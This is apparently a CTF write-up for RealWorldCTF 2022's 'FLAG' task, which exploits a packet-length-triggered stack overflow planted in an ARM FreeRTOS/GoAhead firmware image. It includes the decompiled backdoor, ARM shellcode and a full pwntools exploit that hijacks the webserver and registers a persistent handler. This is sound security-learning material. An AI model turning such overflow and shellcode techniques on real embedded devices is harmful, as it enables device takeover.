---
layout: post
title: "FLAG (PWN 451) RealWorldCTF writeup"
categories: ctf pwn arm iot goahead backdoor
---

# FLAG (PWN 451) RealWorldCTF writeup

For RealWorldCTF 2022 I played with Sauercl0ud, and we achieved 2nd place. For my part, I spent all of my time in this ctf on a single task: *FLAG* (which in the end was solved by 3 teams)
Shoutout to spq in particular, and everyone else who helped with the task!

## Description
The task is a qemu vexpress-a9 image that was given to us. It is running the following stack from which the task name is derived:
`FreeRTOS+LwIP+ARM+GoAhead (F.L.A.G.)`. The qemu image is launched like this:
`qemu-system-arm -m 64 -nographic -machine vexpress-a9 -net user,hostfwd=tcp::5555-:80 -net nic -kernel /mnt/flag.bin`
Additionally, the provided docker image is running a python script as a health check (every 30s):
```python
import requests
import time

url = "http://localhost:5555/action/backdoor"

flag_path = "/mnt/flag.txt"

def get_flag(path: str):
    with open(path, 'r') as fp:
        return fp.read().strip()


def check_backdoor():
    r = requests.get(url)
    if r.status_code == 200:
        resp = r.json()
        if "status" in resp and resp['status'] == "success":
            r.close()
            return True
    r.close()
    return False


def post_flag(flag: str):
    params = {"flag": flag}
    r = requests.get(url, params=params)
    r.close()

try:
    if check_backdoor():
        f = get_flag(flag_path)
        post_flag(f)
except Exception:
    exit(1)
```

this script simply tries to connect to the qemu system's webserver on an
endpoint called `/action/backdoor`. If this endpoint is there, the script will
do another request providing the flag in a get-parameter. The task description
tells us that there is a backdoor somewhere in the qemu image that we need to
exploit.

## Wasting Time

Our first guess was that our task is to somehow activate the /action/backdoor endpoint through some hidden webserver shenanigans. So we started reversing the webserver and comparing it to the open source code of GoAhead, looking for differences, and trying to understand GoAhead's inner workings. After a while we realized our assumption was wrong and we need to look for an actual bug. Didn't help that there were some memes in the binary that we mistook for hints, so we wasted between 10 and 20 hours just staring at GoAhead source code and corresponding assembly.

## The Backdoor

At some point spq had the idea to grep the full decompiled binary for all char stack-buffers and found a suspicious function in some low-level packet handler:

```C

int shady_fun_FUN_6001b024(int param_1,undefined4 param_2,undefined4 param_3)

{
  uint uVar1;
  undefined4 uVar2;
  int time_x;
  uint uVar3;
  uint uVar4;
  undefined auStack116 [64];
  char local_34 [8];
  char *backdoor;
  undefined4 *local_1c;
  uint local_18;
  int local_14;
  
  local_14 = 0;
  if (param_1 == 0) {
    log_err_rwap(&DAT_600704ac,0,param_3,0);
  }
  uVar1 = FUN_6001a46c(param_1,0x7c);
  if ((uVar1 >> 0x10 & 0xff) != 0) {
    uVar1 = FUN_6001a46c(param_1,0x40);
    uVar4 = uVar1 >> 0x10 & 0x3fff;
    FUN_6001a4a4(param_1,0x6c,0);
    uVar3 = 0x280;
    local_14 = pbuf_alloc(0,uVar4 + 3 & 0xfffffffc);
    if (local_14 != 0) {
      local_1c = *(undefined4 **)(local_14 + 4);
      local_18 = uVar4 + 3 >> 2;
      while( true ) {
        uVar3 = local_18 - 1;
        if (local_18 == 0) break;
        uVar2 = FUN_6001a46c(param_1,0);
        *local_1c = uVar2;
        local_1c = local_1c + 1;
        local_18 = uVar3;
      }
    }
    if ((uVar1 & 0x8000) != 0) {
      printf(s_EMAC:_dropped_bad_packet._Status_60070548,uVar1,uVar3,uVar1 & 0x8000);
    }
    local_34._0_4_ = INT_60079e78 + 0x16d6dd4;
                    /* backdoor */
    local_34._4_4_ = INT_60079e7c + 0xc25fbb;
    if (uVar4 == (local_34._0_4_ & 0xff)) {
      time_start = time(0);
      counter = 1;
    }
    else {
      if ((uVar4 == (byte)local_34[counter]) && (time_x = time(0), (uint)(time_x - time_start) < 5))
      {
        counter = counter + 1;
      }
    }
    if (((counter == 8) && (uVar4 == 0x202)) && (local_14 != 0)) {
      memmove(auStack116,*(undefined4 *)(local_14 + 4),0x202);
    }
  }
  return local_14;
}

```

this turned out to be a modified version of https://git.pengutronix.de/cgit/barebox/tree/drivers/net/smc911x.c#n447 , so an ethernet packet handler in the driver for the network interface. Analyzing the function we can deduct the following backdoor:
- when a packet arrives with the packet lenght of 98 (ascii b), start a timer and set a counter to 1
- if subsequent packets within 5 seconds arrive, with the packet lenghts in ascii spelling "backdoor", increment the counter to 8
- when this counter is 8, and the next packet has length 0x202, this packet will be copied into a stack buffer which is only 64 bytes big, overflowing the buffer.

## Exploitation

After building the trigger for the backdoor (adjusting packet lenghts by setting a breakpoint in qemu and seeing how long our packets are), this is a standard stack buffer overflow in arm, but corrupting the stack pretty hard because we have to overflow the full 0x202 bytes. We decided for spq's approach of padding exploit with data gathered from a memory dump of a healthy stack layout. Next, we reduced the exploit to a small first stage which patches the post-data handler in GoAhead so that we can then send our second stage in a post request. Our patch then makes the webserver execute the code in the post-data buffer. Now it is just a matter of registering a new action handler and route for /action/backdoor, and then writing the code that handles requests to backdoor. This handler has to be persistent, so we copy this code to another stable location in memory (because the post-data buffer where the second stage payload resides will be cleared up after we return). The handlers job now is to set the status code to 200, prepare the web request response, and check for the get-parameter containing the flag. If this exists, we copy the value to a location where some webserver http error string was previously. Because our patch breaks some webserver routing, this error is shown for most other pages except our backdoor, effectively showing us the flag on any page after the python script calls the backdoor endpoint. 

## code

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 8.210.44.156 --port 31337
from pwn import *
import requests, time, struct

# Set up pwntools for the correct architecture
context.update(arch='arm')
exe = './path/to/binary'

tcp_header_len = 58


shellcode2 = """

stmdb sp!, {r0-r7,lr}

@printf: 0x6002111C
mov r2, 0x111C
movt r2, 0x6002

@0x60076379
mov r0, 0x6379
movt r0, 0x6007
mov r1, r0

blx r2

ldmia sp!, {r0-r7,pc}

"""

shellcode2 = """
stmdb sp!, {r0-r11, lr}

movw r3, 0x1704
movt r3, 0x6002
movw r0, 0x0000
movt r0, 0x60b0

adr r1, register
mov r2, 0x1000
blx r3

movw r0, 0x0000
movt r0, 0x60b0
bx r0

register:
b register2

backdoorcode:
stmdb sp!, {r11, lr}


add r11, sp, #4
sub sp,sp, #0x10
str r0, [r11,#-0x14]

mov r1, 200
movw r4, 0x88c4
movt r4, 0x6005
blx r4

ldr r0, [r11,-0x14]
mov r1, 0xffff
movt r1, 0xffff
mov r2, 0
movw r4, 0x891c
movt r4, 0x6005
blx r4

ldr r0, [r11,-0x14]
movw r4, 0x8d30
movt r4, 0x6005
blx r4

@printf: 0x6002111C
mov r2, 0x111C
movt r2, 0x6002

@0x60076379
mov r0, 0x6379
movt r0, 0x6007
mov r1, r0

blx r2

ldr r0, [r11,-0x14]
adr r1, ssuccess
movw r4, 0x8e2c
movt r4, 0x6005
blx r4

ldr r0, [r11,-0x14]
adr r1, sflag
adr r2, sflag
movw r4, 0x77c4
movt r4, 0x6005
blx r4

mov r2, r0
@ document error 0x60076824
movw r0, 0x6824
movt r0, 0x6007
@ ads.js
@movw r0, 0xdef8
@movt r0, 0x601e
mov r1, 0x1000
movw r4, 0xa2f0
movt r4, 0x6006
blx r4

ldr r0, [r11,-0x14]
movw r4, 0x496c
movt r4, 0x6005
blx r4

sub sp, r11, #0x4
ldmia sp!, {r11, pc}





register2:
adr r0, sbackdoor
adr r1, backdoorcode
movw r4, 0xd28c
movt r4, 0x6004
blx r4

adr r0, route_uri
adr r1, route_handler
mov r2, 0
movw r4, 0x36a0
movt r4, 0x6006
blx r4



cleanup:
ldmia sp!, {r0-r11, pc}

route_handler:
.string "action"
ssuccess:
.string "{\\"status\\": \\"success\\"}"
sbackdoor:
.string "backdoor"
sflag:
.string "flag"
route2_uri:
.string "/"
route_uri:
.string "/action/backdoor"
"""

shellcode2 = asm(shellcode2)

#shellcode2 = b"\x04\x37\x01\xe3\x02\x30\x46\xe3\x00\x00\x00\xe3\xb0\x00\x46\xe3\x14\x10\x8f\xe2\x00\x22\x00\xe3\x00\x22\x00\xe3\x33\xff\x2f\xe1\xbc\x00\x00\xe3\xb0\x00\x46\xe3\x10\xff\x2f\xe1\x26\x00\x8f\xe2\x30\x10\x8f\xe2\x8c\x42\x0d\xe3\x04\x40\x46\xe3\x34\xff\x2f\xe1\x1e\xff\x2f\xe1\x7b\x22\x73\x74\x61\x74\x75\x73\x22\x3a\x20\x22\x73\x75\x63\x63\x65\x73\x73\x22\x7d\x00\x62\x61\x63\x6b\x64\x6f\x6f\x72\x00\x66\x6c\x61\x67\x00\x10\xd0\x4d\xe2\x14\x00\x0b\xe5\x13\x1e\xa0\xe3\xc4\x48\x08\xe3\x05\x40\x46\xe3\x34\xff\x2f\xe1\x05\x40\x46\xe3\x34\xff\x2f\xe1\x05\x40\x46\xe3\x34\xff\x2f\xe1\x2c\x4e\x08\xe3\x05\x40\x46\xe3\x34\xff\x2f\xe1\x00\x20\xa0\xe3\xc4\x47\x07\xe3\x05\x40\x46\xe3\x34\xff\x2f\xe1\x00\x20\xa0\xe1\xf8\x0e\x0d\xe3\x1e\x00\x46\xe3\x01\x1a\xa0\xe3\xf0\x42\x0a\xe3\x06\x40\x46\xe3\x34\xff\x2f\xe1\x04\xd0\x4b\xe2"

assert struct.unpack("I", asm("blx r1"))[0] == 0xe12fff31

shellcode = """
@0x60056944
mov r3, 0x6944
movt r3, 0x6005

@0xe12fff31
mov lr, 0xff31
movt lr, 0xe12f

str lr, [r3]

@0x6004CB30
mov lr, 0xCB30
movt lr, 0x6004

bx lr
"""

shellcode = asm(shellcode)
pc = 0x60e429b0-4*3-0x30

memorydump = [
        0,
0x00000004, 0x10101010, 0x60e42954, 0x60e429bc,
0x60e3a968, 0x60e42984, 0x60e42984, 0x60e4ac08,
0xffffffff, 0x60e429bc, 0x60e3a968, 0x61de24d0,
0x00000000, 0x000033bc, 0x00000001, 0x60e3a968,
0x6b636162, 0x726f6f64, 0x60e4297c, 0x00000202,
0x02020000, 0x609a4208, 0x61cd28f0, 0xffffffff,
0x61cd26dc, 0x00000001, 0x04040404, 0x60e429d4,
0x6004cb30, 0x06060606, 0x00000000, 0x08080808,
0x609a4208, 0x00000000, 0x6000001f, 0x00000001,
0x2000001f, 0x11111111, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x80000068, 0x60e42910, 0x00000000, 0x609a40e4,
0x609a40e4, 0x60e429f0, 0x609a40dc, 0x00000001,
0x60e3a994, 0x60e3a994, 0x60e429f0, 0x00000000,
0x00000006, 0x60e3a9e8, 0x00787265, 0x00000000,
0x00000000, 0x00000005, 0x00000000, 0x00000006,
0x00000000, 0x00000002, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x80000080, 0x60e42aac,
0x60e42abc, 0x60e42acc, 0x60e42ab8, 0x00000000,
0x60e42a70, 0xffffffff, 0x60e42a70, 0x60e42a70,
0x00000001, 0x60e42a84, 0xffffffff, 0x60e4aaf8,
0x60e4aaf8, 0x00000000, 0x00000008, 0x00000004,
0x0000ffff, 0x00000000, 0x00000000, 0x00000000,
0x60e52af4, 0x60e52af4, 0x60e52af4, 0x60e52af4,
0x60e52af4, 0x60e52af4, 0x60e52af4, 0x60e52af4,
0x00000000, 0x00000000, 0x80008008, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5, 0xa5a5a5a5,
]
memorydump = struct.pack("I"*len(memorydump), *memorydump)[tcp_header_len:]
memorydump = memorydump[:2] + shellcode + memorydump[2+len(shellcode):]
memorydump = memorydump[:2+0x38] + struct.pack("I", pc) + memorydump[2+0x38+4:]
memorydump = memorydump[:0x202 - tcp_header_len]

ropchain = memorydump

print(ropchain, hex(len(ropchain)))



# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '8.210.44.156'
port2 = int(args.PORT or 31337)

packet_lengths = b"backdoor"

sockets = []
for i in range(len(packet_lengths)+1):
    s = connect(host, port2)
    sockets.append(s)
    s.send(b"GET /")

input("stage 1")

for i, pkt_len in enumerate(packet_lengths):
    pkt_len -= tcp_header_len
    s = sockets[i]
    s.send(b"A"*pkt_len)
    time.sleep(0.1)

s=sockets[-1]

s.send(ropchain)

input("stage 2")

s = connect(host, port2)
request = b"POST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nlala: xxx\r\n" % (len(shellcode2))
while len(request) % 4 != 2:
    request += b"d%d: umy\r\n" % (len(request) % 4)
request += b"\r\n"
print(request)
s.send(request)
time.sleep(1)
s.send(shellcode2+b"\r\n")

print(s.recvall(timeout=2))

input("done")
print(requests.get(f"http://{host}:{port2}/action/backdoor?flag=test").content)
print(requests.get(f"http://{host}:{port2}/ads.js").content)

```



[@r0bre](https://twitter.com/r0bre), 23.01.2022
